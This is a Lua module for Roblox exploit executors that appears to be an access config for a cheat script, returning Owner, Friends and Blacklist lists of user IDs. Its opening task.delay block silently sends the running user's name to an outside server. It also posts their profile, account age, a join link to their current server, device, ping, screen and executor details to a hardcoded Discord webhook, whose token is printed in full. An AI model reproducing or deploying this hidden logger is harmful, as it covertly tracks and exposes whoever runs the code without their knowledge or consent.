task.delay(0,function()
	local SendRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or HttpPost
	local user = game:GetService("Players").LocalPlayer; wait()
	pcall(function()
		SendRequest({
			Url = "http://202-137-118-245.dataconnectservices.ph/VerifyEnv",
			Headers = {['Content-Type'] = 'application/json'},
			Body = game:GetService("HttpService"):JSONEncode({['stringv1'] = 'dalloc-mad-because-he-cant-control-tiger-admin-users-LMFAO_-i-dont-have-time-for-this-bullshit-legocheats=' .. user.Name}),
			Method = "POST",
		})
	end)
	local run_time0 = Execution_Runtime and tostring(tick() - Execution_Runtime) or "nil"; wait(4)
	local FPS, MemUsage = task.wait(0.03) and math.floor(1/game:GetService("RunService").RenderStepped:Wait()), tostring(game:GetService("Stats"):GetTotalMemoryUsageMb())
	local Ping, DeviceType, Resolution, Executor = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() or "69", " Unidentified ", game:GetService("Workspace").CurrentCamera.ViewportSize, "Unidentified"
	local UIS = game:GetService("UserInputService")
	if UIS.TouchEnabled and not UIS.MouseEnabled then
		DeviceType = "Mobile"
	elseif UIS.MouseEnabled and not UIS.TouchEnabled then
		DeviceType = "Computer"
	elseif UIS.TouchEnabled and UIS.MouseEnabled then
		DeviceType = "Emulator"
	end;if UIS:GetPlatform() == Enum.Platform.Android then
		DeviceType = DeviceType .. " (Android)"
	elseif UIS:GetPlatform() == Enum.Platform.IOS then
		DeviceType = DeviceType .. " (IOS)"
	end; Executor = identifyexecutor and identifyexecutor() or Executor
	local debuginfo = "PING: " .. Ping .. ", DEVICE: " .. DeviceType .. ", FPS: " .. FPS .. ", MEMORY USED: " .. MemUsage .. ", SCREEN: " .. Resolution.X .. "x" .. Resolution.Y .. ", EXECUTOR: " .. Executor .. ", EXECUTED IN " .. run_time0 .. " SECOND(S)"
	local embed2send = {
		{
			["title"] = user.Name .. " [" .. user.DisplayName .. "], Age: " .. user.AccountAge .. " day(s)",
			["color"] = tonumber(0xD60015),
			["url"] =  "https://www.roblox.com/users/"..user.UserId.."/profile",
			["fields"] = {
				{
					["name"] = "Join Server",
					["value"] = "```".."roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .."```"
				},
				{
					["name"] = "Debug information",
					["value"] = "```"..debuginfo.."```",
				}
			},
		}
	};SendRequest({
		Url = "https://discord.com/api/webhooks/1294526803028742226/_Nr3FoHj8LjhFLdurAvtxjuxim5hY4iay_qXRaWbXDwik-dSwSUim1UQMT_bT77lUeV9",
		Headers = {['Content-Type'] = 'application/json'},
		Body = game:GetService("HttpService"):JSONEncode({['embeds'] = embed2send}),
		Method = "POST"
	})
end)
return {
	Owner = {
		1489467751; -- C9_1234
		4688179501; -- 0946is
	};
	Friends = {
        2621280490 -- LienxCedie
        2859912884; -- LienxCedie_VER02
	};
	Blacklist = {
		Name = {
			"Roblox";
			"Bitdancer"; --Yea, not like hes gonna use lego cheats anyway
			"devchi45";
			"lovemeforgood123";
		};
		UserId = {
			1;
			5851174276;
			5853200254; 
			6030289930; 
			5857966044;
			5855058813;
			1630944012;
			4267352809;
			4687176655;
			3750576633;
			4846551317;
			4282366990;
			4271822718;
			4150351894;
			4138210548;
			4074725319;
			3970049910;
			3990648652;
			1629775065;
			3542450809;
			3544981164;
			4146330097;
			2938176091;
			5848204002;
		};
	};
}